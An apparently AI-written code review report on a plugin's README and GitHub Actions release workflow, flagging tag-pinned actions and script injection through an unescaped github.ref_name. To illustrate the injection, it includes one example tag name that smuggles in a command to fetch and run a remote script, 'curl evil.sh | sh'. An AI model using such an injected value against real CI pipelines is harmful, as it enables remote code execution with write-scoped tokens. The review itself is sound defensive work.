---
phase: 08-readme-release-ship-gate
reviewed: 2026-08-16T16:00:00Z
depth: standard
files_reviewed: 3
files_reviewed_list:
  - README.md
  - .github/workflows/release.yml
  - .claude-plugin/plugin.json
findings:
  critical: 0
  warning: 2
  info: 1
  total: 3
status: issues_found
---

# Phase 08: Code Review Report

**Reviewed:** 2026-08-16T16:00:00Z
**Depth:** standard
**Files Reviewed:** 3
**Status:** issues_found

## Summary

Reviewed `README.md` (new), `.github/workflows/release.yml` (new), and the version bump in
`.claude-plugin/plugin.json` (0.1.0 → 1.1.0). Cross-checked against `08-CONTEXT.md` (D-01–D-11),
both plan files, and both SUMMARY.md execution transcripts, and independently verified against the
live repo/remote state (published `v1.1.0` release, deleted `v0.0.0-rc1` rehearsal, `actions/checkout@v7`
existing as a real upstream tag).

**No BLOCKER-grade findings.** The allowlist zip step is a genuine explicit five-path include list
(verified against the actual published archive listing, not just workflow source), job-level
`GITHUB_TOKEN` permissions are minimal (`contents: write` only, no `write-all`), no hardcoded
secrets, and no rehearsal/debug artifacts survive in the repo or on the remote — `v0.0.0-rc1`'s tag
and release are confirmed absent from `git ls-remote --tags origin` and `gh release list`. README
content is accurate and traceable to executed commands per D-02; all D-04 sections are present in
the required order; the `gsd-core >= 1.6.0` requirement matches `ROADMAP.md` verbatim.

Two WARNING-grade findings on the workflow's supply-chain hygiene, one INFO item on a minor
documentation-precision nit.

## Warnings

### WR-01: `actions/checkout` pinned to a mutable major-version tag, not an immutable commit SHA

**File:** `.github/workflows/release.yml:12`
**Issue:** `uses: actions/checkout@v7` pins to the movable tag `v7`, not a commit SHA. GitHub's own
Actions security hardening guidance recommends pinning third-party (and first-party) actions to a
full-length commit SHA, because a tag can be force-moved by the action's maintainer (or by anyone who
compromises that maintainer's account) to point at different, potentially malicious code without any
change visible in this repo's own diff. `actions/checkout` is a low-risk target (first-party, widely
audited, 8k+ stars per `08-RESEARCH.md`), so this is not blocking, but it is the standard hardening
gap that CI security scanners (`zizmor`, `actionlint --security`, GitHub's own Dependabot/CodeQL
Action-pinning check) flag by default, and `08-RESEARCH.md` records the tag decision without
weighing the SHA-pinning tradeoff at all.
**Fix:**
```yaml
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.1
```
(Resolve the exact SHA for the `v7.0.1` tag and pin to it; keep the version as a trailing comment for
human readability, per GitHub's documented pattern.)

### WR-02: `github.ref_name` interpolated unescaped into a `run:` shell command

**File:** `.github/workflows/release.yml:20`
**Issue:** `run: gh release create "${{ github.ref_name }}" gsd-beads.zip --generate-notes`
interpolates the untrusted GitHub Actions context expression `github.ref_name` directly into the YAML
before the shell ever sees it — the canonical GitHub Actions script-injection pattern (CWE-78-adjacent:
GitHub's own "Understanding the risk of script injection" doc calls this out explicitly for `run:`
steps using `github.*` context values). A tag name containing shell metacharacters (e.g.
`` v1.1.0`; curl evil.sh | sh` ``, or a tag with embedded backticks/`$()`) would execute as
shell code inside the job, with the job's own `contents: write` `GITHUB_TOKEN` in scope. The blast
radius here is smaller than the general case — only accounts with push access to this repo can push a
tag at all, so this is not an externally-exploitable path in the current threat model (a malicious tag
name would have to come from someone who already has write access) — but it is still the wrong pattern
per GitHub's own hardening guidance, and the phase's `08-RESEARCH.md`/threat model does not mention or
accept this risk anywhere (T-08-01/T-08-02/T-08-04 cover the zip allowlist and token scope, not this).
**Fix:** route the value through an `env:` block instead of direct interpolation, so the shell receives
it as a quoted variable rather than as YAML-substituted-then-interpreted text:
```yaml
      - name: Publish release
        run: gh release create "$TAG_NAME" gsd-beads.zip --generate-notes
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG_NAME: ${{ github.ref_name }}
```

## Info

### IN-01: README's worked `bd` example uses a non-literal `<id>` placeholder despite D-02's "verbatim, none paraphrased" rule

**File:** `README.md:39-41`
**Issue:** D-02 states install/uninstall commands are "exact, copy-pasteable, verbatim — none
paraphrased." The worked example (`bd update <id> --claim`, `bd close <id> --reason="Completed"`)
uses a `<id>` placeholder that is not copy-pasteable as-is — a reader must substitute a real issue ID
before running it. This is a deliberate, disclosed choice (per `08-01-SUMMARY.md`'s "Decisions Made"
section) matching `AGENTS.md`'s own established placeholder convention, and is reasonable for a worked
*example* section (as opposed to the Install/Uninstall commands, which are genuinely verbatim). Flagging
only because it is a literal deviation from D-02's stated rule as written, not because the choice itself
is wrong.
**Fix:** None required — optionally add a one-clause note ("replace `<id>` with the issue ID from `bd
ready`'s output") to make the placeholder-vs-verbatim distinction explicit to a cold-stranger reader,
consistent with D-01's audience.

---

_Reviewed: 2026-08-16T16:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
